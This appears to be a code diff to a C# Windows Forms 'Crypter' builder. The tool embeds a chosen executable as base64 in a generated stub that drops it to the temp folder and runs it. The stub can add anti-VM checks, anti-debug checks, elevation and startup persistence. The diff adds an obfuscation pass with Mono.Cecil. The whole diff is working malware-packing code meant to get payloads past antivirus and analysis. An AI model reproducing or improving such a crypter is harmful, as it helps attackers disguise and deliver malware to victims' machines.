@@ -2,13 +2,18 @@
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
+using System.Diagnostics;
 using System.Drawing;
 using System.IO;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using Mono.Cecil.Cil;
+using Mono.Cecil;
+using System.Security.Cryptography;
 using static Crypter.Settings;
+using Crypter.Utils;
 
 namespace Crypter.Forms
 {
@@ -332,7 +337,7 @@ using System.Security.Principal;
 using System.Runtime.InteropServices;
 using Microsoft.Win32;
 
-namespace namespace_name
+namespace priv_stub
 {{
     class Program
     {{
@@ -399,8 +404,10 @@ namespace namespace_name
                 MessageBox.Show("No valid input file to read, is your exe empty or just doesn't exist?", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 return;
             }
+
             byte[] exebytes = File.ReadAllBytes(inputfile.Text);
             string base64exe = Convert.ToBase64String(exebytes);
+
             string stub = PublicStubTemplate(
                 antiVM.Checked,
                 antiDebug.Checked,
@@ -409,18 +416,24 @@ namespace namespace_name
                 runas.Checked,
                 startup.Checked
             );
+
             string executepayload = @"
-                    byte[] exebytes = Convert.FromBase64String(@""" + base64exe + @""");
-                    string tmppath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + "".exe"");
-                    File.WriteAllBytes(tmppath, exebytes);
-                    Process.Start(tmppath);";
+        byte[] exebytes = Convert.FromBase64String(@""" + base64exe + @""");
+        string tmppath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + "".exe"");
+        File.WriteAllBytes(tmppath, exebytes);
+        Process.Start(tmppath);";
+
             stub = stub.Replace("string encryptedexe = \"TEMP\";", executepayload);
+
+            string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+            string stubPath = Path.Combine(appDataPath, "stub.exe");
+            string obfPath = Path.Combine(appDataPath, "stub_obf.exe");
 
             var csc = new Microsoft.CSharp.CSharpCodeProvider();
             var parameters = new System.CodeDom.Compiler.CompilerParameters
             {
                 GenerateExecutable = true,
-                OutputAssembly = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "stub.exe"),
+                OutputAssembly = stubPath,
                 CompilerOptions = "/target:winexe",
                 IncludeDebugInformation = false
             };
@@ -436,12 +449,24 @@ namespace namespace_name
             if (results.Errors.HasErrors)
             {
                 string errors = string.Join("\n", results.Errors.Cast<System.CodeDom.Compiler.CompilerError>().Select(err => err.ToString()));
-                MessageBox.Show("Compilation failed:\n" + errors);
-                Console.WriteLine(errors);
+                MessageBox.Show("Compilation failed:\n" + errors, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return;
+            }
+
+            if (obfuscator.Checked)
+            {
+                if (!File.Exists(stubPath))
+                {
+                    MessageBox.Show("Built stub.exe not found! Obfuscation skipped.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    return;
+                }
+
+                Obfuscator.Obfuscate(stubPath, obfPath);
+                MessageBox.Show("Stub built to AppData as stub_obf.exe!", "Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
             }
             else
             {
-                MessageBox.Show("Stub built to AppData as stub.exe!", "Stub Built", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                MessageBox.Show("Stub built to AppData as stub.exe!", "Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
             }
         }
     }
